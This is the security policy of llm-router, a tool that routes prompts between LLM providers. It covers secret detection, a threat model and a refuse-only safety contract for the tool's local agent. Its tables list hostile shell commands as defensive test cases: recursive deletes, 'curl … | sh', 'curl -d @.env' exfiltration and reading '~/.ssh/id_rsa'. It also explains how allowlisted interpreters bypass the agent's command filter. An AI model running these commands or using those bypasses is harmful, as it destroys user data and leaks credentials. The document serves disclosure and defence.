# Security Policy

## Reporting Security Vulnerabilities

If you discover a security vulnerability in llm-router, please **do not open a public GitHub issue**. Instead, email:

**yali.pollak@gmail.com**

Please include:
- Description of the vulnerability
- Steps to reproduce (if applicable)
- Potential impact
- Suggested fix (if you have one)

**Response timeline:**
- We will acknowledge receipt within 24 hours
- We will provide an initial assessment within 3 business days
- We will work on a fix and provide a timeline for release
- We will credit you in the security advisory (unless you request anonymity)

## Security Best Practices

### Data Handling & Storage Mapping

**What llm-router does with your prompts:**
- ✅ Routes to the best model based on complexity
- ✅ Tracks token usage locally (SQLite on your machine)
- ✅ Caches classification results (locally, with TTL)
- ❌ Does NOT store your prompts permanently
- ❌ Does NOT log full prompts (only task type + complexity)
- ❌ Does NOT share prompts between providers unless you ask

**Data Storage Locations:**

| Data Type | Storage | Location | Encryption | Retention |
|-----------|---------|----------|-----------|-----------|
| **Prompts** | Not stored | Transient (memory) | N/A | 0 seconds |
| **API Keys** | File | `.env` / `~/.llm-router/config.yaml` | Filesystem perms | Until rotated |
| **Usage metrics** | SQLite DB | `~/.llm-router/usage.db` | Filesystem perms | 180 days (configurable) |
| **Classification cache** | In-memory LRU | Process memory | N/A | 24 hours |
| **Hook scripts** | Files | `~/.claude/hooks/` | Filesystem perms | Until uninstalled |
| **Logs** | Structured JSON | Stdout + optional file | Filesystem perms | 7 days default |
| **OAuth tokens** | File (encrypted) | `~/.cache/anthropic/` | OS keyring | Until revoked |

**Multi-provider routing:**
When you route a task, your prompt is sent to:
1. **Local Ollama** (if configured) — stays on your machine when the Ollama endpoint (`OLLAMA_API_BASE`, else `http://localhost:11434`) is loopback. Since LC-12h the router's prompt-carrying calls to a loopback daemon ignore `HTTP_PROXY` / `HTTPS_PROXY` / `ALL_PROXY` (LiteLLM honoured them even for `localhost`). An endpoint you point at another host, or a loopback port that forwards elsewhere (`ssh -L`, a local reverse proxy), sends the prompt there. LiteLLM's own model-info lookup (`POST /api/show`, which would carry the model name, the daemon URL and `OLLAMA_API_KEY`) is made impossible, not just unlikely: `local_privacy.ensure_ollama_model_info` puts a failure-shaped entry in `litellm.model_cost` before its own direct fetch, makes concurrent callers for the same model wait for that fetch (at most the 2 s fetch timeout plus 1 s), and re-inserts the entry if it is missing on any later call (a cost-map reload). Residual: if that insert itself raises (counted as `CHZ-FO-LOCAL-PRIVACY-MODEL-INFO` in failopen), LiteLLM does its own lookup.
2. **Your configured providers** (OpenAI, Gemini, etc.) — governed by their privacy policies
3. **Not** to llm-router servers — we don't run servers

**Prompts that contain a secret (LC-12h, D-28 A):**
When the router is handed a request in which a high-precision secret is found, it sends that request only to
Ollama models on a loopback daemon (`-cloud` models excluded), or refuses it when there is none. "High
precision" means a real-looking value, not a shape alone: a provider key prefix (Anthropic, OpenAI, OpenRouter,
Google, GitHub, Slack, AWS `AKIA`/`ASIA`) with enough length and entropy, a PEM private-key block with a body,
a bearer token with entropy, a database URL whose password is not a common word, or a JWT that decodes to real-looking claims. Obvious placeholders are
not refused: AWS documentation keys (`...EXAMPLE`), runs of `x` / `*` / `0` / `.`, `YOUR_...` / `<...>` /
`${...}` / `changeme` / `placeholder` / `dummy` / `test` values (a value that is itself shaped like one), sequential typing, URL passwords equal to the
user name or in a short common-word list (`postgres:postgres@`, `user:password@`, `admin:admin@`), the jwt.io sample
and JWTs whose identity claims are all test/demo values (or `alg: none`, or whose signature is a placeholder). A value on
a line, or up to two lines under a line, that carries a filename or config cue (`.env.example` / `.env.sample` /
`.env.template` / `example.env`, "sample config" / "example env", or a path ending `.example` / `.sample` /
`.template`) is not refused either: the cue is the author's statement that it is an example, so a real secret next to
such a cue is exempt too (residual: anyone can type the cue). Free-text words (`fake`, `dummy`, `placeholder`, "not a
real", "for illustration") are not cues and exempt nothing: `fake? no. <key>` is refused. Separate residual: the placeholder-value exemptions look at the value itself (a stopword list and substrings such as `example`, `dummy`, `placeholder`, `changeme`), so a real secret that happens to contain one of those words is exempt. Every exemption is counted
as `exempted_by_label:<category>`. Quoted `api_key = "..."` literals are log-only: counted by category (`local_privacy.secret_counts`, a
counter and the category, never the value) and never refused. `engine.secret_findings` is the detector; its quantifiers
are bounded and it scans long text in overlapping windows, so it is linear in the text and misses nothing at a
window edge. A refused call skips the semantic cache and the judge queue, gets no emergency fallback to the budget
chain, may not switch to a non-local model on overflow, and the LLM complexity classifier is not called for it.
Doors: `route_and_call` (the `llm_*` MCP tools, the gateway), `route_and_stream`, the `llm_stream` tool and the
SDK (`llm_router.sdk.route`, whose Ollama leg also goes direct).
- **The scan reads** the new request: the prompt, the system prompt and the caller context of this one call. **Not**
  earlier turns of the conversation (`messages`): each was scanned when it was the new request, and scanning them again
  made one past secret refuse every later turn. The price: a real secret in turn 3 that the caller overrode (or that a
  host sent on its own) is replayed to a cloud model in turn 4 as history, and the door does not see it. It is
  counted, not blocked: each request whose `messages` hold a high-precision secret shape adds
  `history_secret_shape:<category>` (category only, never the value) to `local_privacy.secret_counts`. The
  `tool_calls` arguments of assistant messages are not read by that count or by any scan (only `content` text is).
- **The refusal** names the category and the place, never the value, and the way forward: start a local model
  (`llm-router local-check`), remove the secret, or override. The gateway answers HTTP 422 with that text (a 5xx
  would invite retries) with a typed body, `{"error": {"type": "secret_local_only_refused", "categories": [...],
  "places": [...], "remedy": ...}}`; the MCP tools return the message as the tool error; the SDK raises a
  `RoutingError` that is also a `SecretLocalOnlyRefused`.
- **Override, per request:** start the prompt with `cloud:` (stripped before anything reads the text, but only when the request holds a secret; with no secret the prompt is left exactly as typed), or pass the
  flag where a prefix cannot be typed: `allow_cloud=True` (`route_and_call`, `sdk.route` / `Router.run`), the body field
  `"allow_cloud": true` (`/route`) or the header `X-LLM-Router-Allow-Cloud: 1` (gateway). The
  request then routes as ordinary traffic, and the override is counted (`overridden:<category>`), category only. An explicit
  cloud `model` on a secret request is refused unless the prefix is present; it is no longer silently replaced by
  a local model.
Limits:
- The **Claude Code proxy** (`llm-router proxy`) only logs a secret (D-28 A); it does not reroute. Its local-model
  backend uses a shared httpx client that follows proxy env (open, see the table).
- The **Claude Code hooks' direct-execution path** (`hooks/auto-route.py` -> `execute_chain`) is not behind this
  door (open). Only `sdk.route` is.
- llm-router controls only what it forwards: a prompt typed into Claude Code (or another host) has already
  gone to that host's model.
- Agent delegation (`llm_act` delegate / `llm_delegate`, which runs CLI agents such as Codex) does not go
  through this door.
- The scan reads the request's own text, not session history the router injects afterwards, and it does not
  catch secrets that match none of its shapes, or low-entropy secrets (a dictionary-word database password).

**Ollama requests made with urllib or a shared httpx client** (every site found by `grep urlopen` and
`httpx` under `src/llm_router`; status as of LC-12h repair 1). "fixed" = goes through `local_privacy.open_url`: no
proxy env, no redirect, for a loopback daemon; a remote daemon keeps the user's proxy policy. "open" = still follows
the proxy env when one is set.

| Site | Carries | Status |
|---|---|---|
| `context_summary.py` (`_generate`, session-end summary) | conversation text | fixed |
| `hooks/auto-route.py` (`classify_with_ollama`, first 500 chars of a prompt) | prompt text | fixed (hook v78) |
| `hooks/direct_executor.py` (`call_ollama`, `ollama_is_alive`, `available_ollama_models`) | prompt text, probes | fixed |
| `toolkit/adapters/ollama.py` | agent messages | fixed |
| `hooks/playwright-compress.py` | page snapshot text | fixed (hook v5) |
| `model_evaluator.py` | synthetic benchmark prompt | fixed |
| `hooks/agent_loop.py` | agent messages | fixed |
| `agentic/react.py` | agent messages | fixed |
| `local_classifier.py` (`_post`, eval harness only) | classifier input | fixed |
| `hooks/tool_intercept.py` (`describe_image`) | image bytes | fixed |
| `proxy/server.py` (local-model backend on the shared httpx client; warm-up `httpx.post`) | prompt text | open |
| `context_summary.py`, `model_discovery.py`, `discover.py`, `ollama_watchdog.py`, `warm.py`, `local_context_guard.py`, `quickstart.py`, `seats.py`, `commands/doctor.py`, `commands/verify.py`, `commands/pi.py`, `resolver/inventory.py`, `resource_map.py`, `runtime_offer.py`, `service_manager.py`, `model_pull.py`, `discovery_rescan.py`, `local_platforms.py` (`/api/tags`, `/api/ps`, `/api/show`, `/api/version`, pulls) | model names and health only, no user text | open |
Details and measurements: [docs/local-check-routing.md](docs/local-check-routing.md) ("HTTP proxy environment").

**Encryption Status:**
- ✅ API keys in transit: TLS (1.2+) to providers
- ✅ OAuth tokens: Stored in OS keyring (macOS Keychain, Linux Secret Service)
- ⚠️ SQLite database: Stored unencrypted on disk (encrypted filesystem recommended)
- ⚠️ Config files: Stored with filesystem permissions (600)

**Data Retention & Deletion:**
- Usage metrics: Kept for 180 days (configurable via `LLM_ROUTER_METRICS_RETENTION_DAYS`)
- Classification cache: Cleared every 24 hours or on process restart
- OAuth tokens: Cached until revoked or manually deleted
- Logs: Rotated daily, kept for 7 days
- Prompts: Never persisted to disk

To delete all llm-router data:
```bash
# Remove all stored data
rm -rf ~/.llm-router/
rm -rf ~/.cache/anthropic/
rm ~/.env  # If used

# Remove hooks
~/.claude/hooks/auto-route.py --uninstall
```

**Your responsibility:**
- Ensure your prompt doesn't contain sensitive data you don't want to share
- If using team features, be aware prompts may be logged for auditing
- Review provider privacy policies (especially if routing to Gemini or GPT-4o)
- Keep filesystem encrypted if storing sensitive metrics

### API Key Storage

**How API keys are stored:**
- `.env` file (project-level) — local, not checked in git
- `~/.llm-router/config.yaml` — user-level, readable by user only
- Environment variables — volatile (only for current session)

**Key rotation:**
- Keys are never refreshed automatically (except OAuth tokens)
- Replace keys in `.env` or `config.yaml` to rotate
- llm-router doesn't cache keys beyond the current session

### Prompt Injection Protection

**llm-router protects against:**
- ✅ Prompts that try to override routing rules
- ✅ Prompts that contain secret formatting (delimited in logs)
- ✅ Injection markers detected and logged

**Limitations:**
- ❌ Cannot prevent model jailbreaks (up to provider)
- ❌ Cannot guarantee secrets won't be exposed if user puts them in prompt
- ❌ Malicious prompts still reach the model (as intended)

### Dependency Security

**llm-router dependencies:**
- Core deps: mcp, litellm, pydantic, aiosqlite
- Optional deps: fastapi (dashboard), opentelemetry (tracing)

**Our commitment:**
- ✅ Use only well-maintained, widely-used packages
- ✅ Pin dependency versions to avoid surprise updates
- ✅ Run `pip-audit` in CI to detect known CVEs
- ✅ Subscribe to security advisories for key dependencies
- ❌ Do not use unaudited or experimental packages

**Your responsibility:**
- Keep llm-router updated (we release security patches promptly)
- Keep Python updated (3.10–3.13 supported)
- Keep your API keys secret

### Hook Security

**Hooks are shell scripts installed in ~/.claude/hooks/:**
- ✅ Hooks are subject to deadlock detection before installation
- ⚠️ Hooks **can** block core tools (Read, Edit, Bash, Write). PreToolUse enforcement
  does this routinely in `smart` and `hard` modes — it is the mechanism those modes are
  built on, not an edge case. What is guaranteed is **no permanent lockout**: every block
  carries an escape valve (call any `llm_*` tool), and repeated attempts auto-pivot to
  release the lock. True deadlock, in the CS sense, is what is prevented — not blocking.
- ✅ Hooks are local (don't phone home)

**Risks:**
- ⚠️ If your machine is compromised, hooks could be modified
- ⚠️ Hooks run with your user permissions

**Your responsibility:**
- Inspect hooks before installation: `cat ~/.claude/hooks/auto-route.sh`
- Use `--check` flag to preview changes: `llm-router install --check`
- Report suspicious hook behavior

### Rate Limiting & Abuse

**llm-router does NOT:**
- ❌ Bypass provider rate limits
- ❌ Help you spam APIs
- ❌ Hide requests from audit logs

**llm-router DOES:**
- ✅ Respect provider rate limits
- ✅ Add request authentication (your API keys)
- ✅ Log all routed calls for audit purposes

**Provider policies:**
- Ensure you comply with each provider's terms of service
- OpenAI, Gemini, etc. have their own abuse policies
- llm-router cannot protect you from violating those policies

## Threat Model

This section describes threats llm-router is designed to protect against and known limitations.

### Threats We Protect Against

| Threat | Scenario | Mitigation |
|--------|----------|-----------|
| **Prompt Leakage** | Accidental prompt in logs | Prompts never written to disk; only task metadata logged |
| **API Key Exposure** | Keys in git or plaintext | `.env` in `.gitignore`; keys in `config.yaml` with 600 perms |
| **Routing Injection** | Malicious prompt tries to override routing | Routing rules in code, not parsed from prompts |
| **Token Theft** | OAuth token copied from memory | OAuth tokens stored in OS keyring (macOS/Linux) |
| **Untrusted Hooks** | Malicious auto-route hook | Hooks reviewed at install. NOTE: hooks can and do block core tools by design; the guarantee is escape-valve + auto-pivot, so no permanent lockout — see Hook Security above |
| **Provider Man-in-the-Middle** | Network attack on API calls | All provider calls use TLS 1.2+; provider auth via keys |
| **Unauthorized Access** | Unauthorized user runs routing | Routed prompts respect system user permissions |
| **Rate Limit Bypass** | User overrides rate limits | Rate limits enforced by providers, not bypassed |

### Threats We DON'T Protect Against

| Threat | Why | Responsibility |
|--------|-----|-----------------|
| **Model Jailbreaks** | Provider's problem, not ours | Depends on model vendor security |
| **Prompt Injection in Model** | Cannot prevent at routing layer | Separate LLM security discipline needed |
| **Stolen API Keys** | Key in environment/config | Store keys securely; rotate regularly |
| **Machine Compromise** | Malware can read all data | Use full-disk encryption; keep OS updated |
| **Provider Data Breach** | Provider's infrastructure | Review provider SLA/privacy policy |
| **Social Engineering** | Phishing for keys/prompts | User training and careful access control |
| **Accidental Data Exposure** | User puts secrets in prompts | User discipline; review before routing |
| **Malicious Dependencies** | Compromised upstream package | Keep dependencies updated; use pip-audit |

### Insider Threats

If you believe llm-router or a contributor has a security vulnerability:

1. **Do NOT** open a public issue
2. Email **yali.pollak@gmail.com** with details
3. Include: description, reproduction steps, impact, suggested fix
4. Response timeline:
   - 24 hours: Receipt acknowledgment
   - 3 business days: Initial assessment
   - 30 days: Patch release or mitigation

## Incident Response

### If You Suspect a Breach

1. **Immediate Actions:**
   - Stop using llm-router immediately
   - Rotate all API keys (OpenAI, Gemini, etc.)
   - Review recent logs: `tail -f ~/.llm-router/session.log`
   - Check ~/.llm-router for unauthorized files

2. **Report to Us:**
   - Email yali.pollak@gmail.com with details
   - Include timeline, affected systems, and scope

3. **Notify Providers:**
   - Contact OpenAI, Gemini, etc. if API keys were exposed
   - Request audit of recent calls
   - May be able to revoke tokens

4. **Mitigation:**
   - Clear all data: `rm -rf ~/.llm-router/`
   - Reinstall: `pip install --upgrade llm-routing`
   - Reconfigure with new API keys

### If We Report a Vulnerability

When llm-router maintainers report a security vulnerability:

1. **Patch released:** Update immediately with `pip install --upgrade`
2. **GitHub Security Advisory:** Posted to notify all users
3. **Release notes:** Security fixes highlighted
4. **CVE tracking:** Critical issues tracked in official databases

### Our Commitment

- ✅ Respond to security reports within 24 hours
- ✅ Provide patches within 30 days for non-critical issues, 7 days for critical
- ✅ Credit responsible disclosures (unless requested otherwise)
- ✅ Post security advisories publicly after patches are available

## Local action safety contract (refuse-only)

**v16 is refuse-only.** The router never runs a destructive local action on your
behalf, and there is **no approval flow in v16**: nothing asks you "run this?",
so nothing can be approved. A command the policy cannot clear is refused, and the
model is told it was not run. An approval prompt is planned for 16.x
(owner decision D-321, 2026-10-28, which amends NFR-SAFE from "destructive needs
approval" to "destructive is refused").

**One policy.** `src/llm_router/write_policy.py` is the only policy for local
actions. `contain` is the one path-containment test, `check_write` its verdict for
a file-tool write, `check_command` the static shell tripwire (P2.9-b), and
`check_action` is `check_command` plus the destructive table (P2.9-a). Three lanes
call it, each before anything runs:

| lane | entry point | code |
|---|---|---|
| `llm_act` | local ReAct executor, `bash` and `write_file` tools | `src/llm_router/agentic/react.py` (`default_tool_executor`) |
| `llm_local_task` | agent loop, also used by `LLM_ROUTER_DIRECT_EXECUTION` | `src/llm_router/hooks/agent_loop.py` (`execute_tool`, `_run_command_line`) |
| `toolkit` | `llm-router run`, in a copied workspace; bash only when `sandbox.bash_enabled()` | `src/llm_router/toolkit/policy.py` (`Policy.decide`) |

**Verdicts.** `write_policy` has three verdicts, precedence `refuse` >
`needs_approval` > `allow`. Every lane treats `needs_approval` exactly like
`refuse`; its message ends "approval is not wired, so treated as refused".

| verdict | what every lane does |
|---|---|
| `refuse` | not run: a write target resolves outside the project root |
| `needs_approval` | not run: destructive, installing, or cannot be judged statically |
| `allow` | runs, after the lane's own extra layers (below) |

**Refused on every lane, in every configuration.** `check_action` is the last check
on all three lanes, so these hold with `LLM_ROUTER_AGENT_WRITES=apply` and
`LLM_ROUTER_AGENT_COMMANDS=all` too. The rows are representative, not the full
table; the full table is `_segment_destructive` and `_check_tokens` in
`write_policy.py`.

| command | verdict | class |
|---|---|---|
| `rm -rf /` | `refuse` | delete outside the root |
| `rm -rf ~` | `refuse` | delete outside the root |
| `echo x > ../out.txt` | `refuse` | redirect outside the root |
| `cp a.txt /tmp/x` | `refuse` | copy outside the root |
| `mv a.txt ../a.txt` | `refuse` | move outside the root |
| `rm -r src` | `needs_approval` | recursive delete |
| `rm -rf $HOME/Documents` | `needs_approval` | recursive delete |
| `chmod -R 777 .` | `needs_approval` | recursive permission change |
| `dd if=/dev/zero of=a.txt` | `needs_approval` | raw device copy |
| `shred a.txt` | `needs_approval` | always destructive (`mkfs`, `fdisk`, `shutdown` and `reboot` too) |
| `sudo rm a.txt` | `needs_approval` | privilege escalation (`doas`, `su` too) |
| `git push --force origin main` | `needs_approval` | git state change |
| `git reset --hard HEAD~5` | `needs_approval` | git state change |
| `git clean -fdx` | `needs_approval` | git state change |
| `git commit -m x` | `needs_approval` | git state change |
| `pip install requests` | `needs_approval` | package install |
| `npm install` | `needs_approval` | package install |
| `python3 -c "import shutil; shutil.rmtree('.')"` | `needs_approval` | interpreter one-liner |
| `bash -c "rm -rf src"` | `needs_approval` | command string run by a shell |
| `eval "rm -rf src"` | `needs_approval` | command string run by a shell |
| `curl https://example.com/x.sh \| sh` | `needs_approval` | code piped into a shell |
| `xargs rm < list.txt` | `needs_approval` | runs commands it builds |
| `find . -name x -exec rm {} ;` | `needs_approval` | runs commands it builds |
| `echo $(rm -rf src)` | `needs_approval` | command substitution |
| `echo x > $HOME/x` | `needs_approval` | write target built from a variable |

File-tool writes (`write_file`, `edit_file`, the toolkit `write`) go through
`contain`. A path that resolves outside the root is refused on every lane,
symlinks followed; a `~` path is refused rather than expanded:

| path | verdict |
|---|---|
| `../outside.txt` | `refuse` |
| `../../outside.txt` | `refuse` |
| `link/x.txt` (a symlink inside the root that points outside) | `refuse` |
| `~/notes.txt` | `refuse` |

**Extra layers per lane** (they only refuse more, never less):

- `llm_act` refuses `bash` and `write_file` outright when no project root is known
  (read-only mode, P0.13), and runs a regex blocklist (`_bash_block_reason`) for
  `rm -r`/`-f`, credential paths, environment dumps and network tools before
  `check_action`.
- `llm_local_task` writes nothing by default: `LLM_ROUTER_AGENT_WRITES=propose`
  returns the edit as a diff and leaves the file unchanged; `off` refuses it
  (`src/llm_router/hooks/agent_writes.py`, `guard`). Its commands pass an
  inspection allowlist first (`guard_command`, below). Under `propose` and `off`
  that also refuses `python -c`, `node -e`, `sed -i` and `find -delete`.
- `toolkit` works on a copy of the project, allows bash only when the OS sandbox is
  available, and has its own program allowlist (`ALLOWED_PROGRAMS`).

**This is a tripwire, not a sandbox.** Static reading of a command line cannot see
what a permitted program does on its own: a test runner, `go run`, `cargo run` or
`git -c core.pager=…` runs the repository's code. Reads outside the root and
network use are not part of this contract. An OS-level write sandbox is 16.1.

Runs by design (the same reach as the lane's own file tools, or the point of the
lane):

| lane | command |
|---|---|
| `llm_act` | `rm a.txt` |
| `llm_act` | `: > a.txt` |
| `llm_act` | `pytest -q` |
| `llm_local_task` | `pytest -q` |

**Known gaps: destructive commands that still run.** Measured 2026-10-28 against
the real executors with the execution step replaced by a recorder. Each row is
pinned as a strict expected failure in `tests/test_security_docs_match_the_code.py`,
so a fix fails that test until the row moves out of this table.

| lane | configuration | command | why it runs |
|---|---|---|---|
| `llm_act` | default | `find . -delete` | deletes every file under the root; `rm -r` is refused but `find -delete` is not on the destructive table |
| `llm_act` | default | `tar -xf a.tar -C /` | extracts outside the root; the tripwire does not read `tar -C` |
| `llm_act` | default | `unzip a.zip -d /tmp` | extracts outside the root; the tripwire does not read `unzip -d` |
| `llm_act` | default | `kill -9 1` | a process signal is not a write, so nothing checks it |
| `llm_act` | default | `pkill python` | a process signal is not a write, so nothing checks it |
| `llm_local_task` | default | `git rm -r src` | `git rm` is on neither git table; deletes tracked files under the root |
| `llm_local_task` | `LLM_ROUTER_AGENT_WRITES=apply` | `find . -delete` | the `find -delete` refusal applies only while writes are not applied |
| `llm_local_task` | `LLM_ROUTER_AGENT_COMMANDS=all` | `wget -O /etc/x https://example.com` | without the allowlist, a program that writes on its own reaches outside the root |
| `llm_local_task` | `LLM_ROUTER_AGENT_COMMANDS=all` | `rsync -a --delete . /tmp/x` | without the allowlist, a program that writes on its own reaches outside the root |

**Out of scope.** Work delegated to an external agent CLI (`codex exec`, from
`src/llm_router/agentic/adapters.py` and `src/llm_router/codex_agent.py`) runs
under that CLI's own sandbox (`--sandbox workspace-write`, or Codex's exec default),
not under `write_policy`.

`tests/test_security_docs_match_the_code.py` reads the tables in this section and
runs every row through the real lane executors. `tests/test_write_policy_one_policy.py`
holds the P2.9-a corpus (10 outside-root and 10 destructive attempts per lane).

## LLM_ROUTER_DIRECT_EXECUTION — what it actually grants

**Default: on.** With it enabled, `hooks/auto-route.py` attempts to answer a prompt
locally before Claude Code sees it. For prompts it classifies as needing file work, it
runs a tool-calling agent loop (`hooks/agent_loop.py`) that hands the local model
`write_file`, `edit_file` and `run_command`, up to 15 iterations. Writes do not
reach disk by default — `LLM_ROUTER_AGENT_WRITES` defaults to `propose`.

### What is actually enforced

- File-path operations are confined to the project root. This works as described.
- `run_command` does **not** execute through a shell. `hooks/agent_loop.py` uses
  `shlex.split` and `subprocess.run(argv, ...)` with `shell=False`, so shell
  metacharacters are literal arguments. (This document previously said the
  opposite; the code has never matched that claim.)
- `run_command` passes two independent layers: `agent_writes.guard_command` — an
  allowlist of inspection programs plus blocked subcommands — and then
  `_BLOCKED_COMMANDS`, a regex over top-level destructive patterns.

  **The allowlist is a typo-and-footgun guardrail. It is not a containment
  boundary, and it does not prevent arbitrary code execution.** An agent with
  `run_command` can execute arbitrary code as the operator, with the operator's
  files, credentials and network access.

  That is not a defect to be patched. The design goal — let a local model run
  the repo's own dev tools — and the security goal — constrain what it can do —
  are in direct conflict, and the allowlist resolves that conflict toward
  capability. **10** of its 28 permitted programs are general-purpose
  interpreters, and each one is a complete bypass of every rule the list
  expresses:

  | program | how it executes caller-supplied code |
  |---|---|
  | `python`, `python3` | `-c` runs arbitrary source |
  | `node` | `-e` runs arbitrary source |
  | `awk` | `BEGIN` blocks run; `\|getline` spawns a shell |
  | `sed` | GNU `e` executes its argument |
  | `find` | `-exec` runs any program with any arguments |
  | `git` | `-c core.pager=…` and the alias mechanism both execute |
  | `pytest` | loads plugins and runs the repo's own code, by design |
  | `go` | `go run` compiles and executes a file in the repo |
  | `cargo` | `cargo run` compiles and executes the crate |

  Blocking one of these closes one door of eleven, so none is blocked.

  **One narrowing, by write mode (SEC-006, 2026-09-24).** `LLM_ROUTER_AGENT_WRITES`
  used to gate only `write_file`/`edit_file`, while `python3 -c "open(p,'w')…"`
  through `run_command` wrote anywhere, even outside the project. Under `propose`
  (the default) and `off`, `guard_command` now also refuses the argv shapes that
  write: `python -c`, `node -e/--eval/-p/--print`, `sed -i`/`--in-place`, and
  `find` with `-delete`/`-exec`/`-execdir`/`-ok`/`-fprint*`. Under `apply` they pass
  `guard_command`; the later `write_policy.check_action` layer still refuses
  `python -c`, `node -e`, GNU `sed e` and `find -exec` on every lane (see "Local
  action safety contract (refuse-only)" above). This does **not** make `propose` a
  containment boundary: `awk`, GNU `sed e`, `git -c`, `pytest`, `go run` and
  `cargo run` still execute code in every mode.

  **What the numbers mean.** `docs/security_command_matrix.txt` carries two
  populations, and the difference between them is the point:

  | population | result |
  |---|---|
  | twelve obviously destructive commands (`rm -rf /`, `git push --force`, `curl -d @.env`) | **10 of 12 refused** |
  | the same capabilities via allowlisted interpreters, `AGENT_WRITES=apply` | **10 of 10 ALLOWED** |

  Earlier revisions of this file quoted only the first row. That number was
  accurate, reproducible, and more misleading than a wrong one would have been,
  because it invited the reader to conclude the allowlist constrains an agent.
  `cat ../../.ssh/id_rsa` is refused; `python3 -c` reading the same file is not.

  Both numbers are derived by `tests/test_r3_allowlist_is_not_containment.py`,
  which re-runs every corpus row through `guard_command` and fails if a verdict
  drifts. Do not edit them by hand. Adding an eleventh interpreter to the
  allowlist also fails that test, by name.

  **What to do about it.** For a repository you trust, the allowlist does the
  job it is good at: it stops a model from casually running something
  destructive, and it makes the intent of a command reviewable. For an
  untrusted repository, or any context where the agent's input is not yours,
  use OS-level containment — a container, a VM, or macOS `sandbox-exec` — or
  set `LLM_ROUTER_AGENT_COMMANDS=off` and drop `run_command` from the tool set.
  The allowlist is not a substitute for either.

- `LLM_ROUTER_AGENT_COMMANDS=all` skips the allowlist entirely, leaving only the
  regex. `llm_local_task` set that implicitly whenever writes were applied; since
  2026-09-14 it does not, and its `apply_writes` defaults to False.

### What that filter does NOT cover — measured against 13.0.1, not estimated

Of twelve representative commands, **three** are blocked:

| command | blocked |
|---|---|
| `rm -rf /`, `bash -c 'rm -rf /'`, `rm  -rf  /` | ✅ |
| `rm -rf ./src` — targeted delete inside the project | ❌ |
| `rm -rf $HOME/Documents` — home via shell expansion | ❌ |
| `git push --force origin main` | ❌ |
| `git reset --hard HEAD~5` | ❌ |
| `npm install <anything>` / `pip install <anything>` | ❌ |
| `cat ../../.ssh/id_rsa` — read outside the project | ❌ |
| `curl -X POST https://… -d @.env` — exfiltrate secrets | ❌ |
| `echo $LLM_ROUTER_API_KEY` / `echo $OPENAI_API_KEY` | ❌ |

The blocklist stops catastrophic *system* damage. It does not stop project damage,
credential disclosure, or network exfiltration.

### A safety claim in the code that does not hold

`agent_loop.py`'s module docstring states *"All file operations are sandboxed to the
project directory."* That is true of `write_file`/`edit_file` and **false in effect**,
because `run_command` runs an arbitrary shell string: `cat ../../.ssh/id_rsa` is not a
"file operation" the sandbox sees. A reader forms a guarantee the code does not provide.

### Should it default to on?

Stated as a judgement, not a fact: **probably not, in this shape.** A default-on feature
that grants unsupervised shell to a local model is a larger grant than "route my prompts
cheaply" implies, and a user who never opts in has no reason to expect it. The
conservative alternatives are (a) default the agent loop off while leaving read-only
direct execution on, or (b) keep it on but drop `run_command` from the default tool set.

This entry documents the current state rather than changing it — a default change needs
its own decision and its own release note, not a drive-by.

Disable with `LLM_ROUTER_DIRECT_EXECUTION=false`.

## Known Limitations

- **SQLite concurrency:** Not suitable for teams (use Redis backend instead)
- **Token estimation:** Approximate; real costs may differ
- **Provider dependence:** If a provider goes down, routing fails for that provider
- **Prompt visibility:** Your prompts are sent to configured providers
- **No prompt encryption:** Prompts sent to providers in plaintext (provider's TLS handles transit security)

## Security Roadmap

- [ ] v7.7: Redis backend for distributed cost tracking
- [ ] v7.8: End-to-end encryption for hook scripts
- [ ] v8.0: Audit log with cryptographic signing
- [ ] v8.1: Hardware security module (HSM) support for key storage

## Credits

Security researchers who've responsibly disclosed issues:
- (To be added as reports come in)

---

Last updated: 2026-04-27
Policy version: 1.0.0
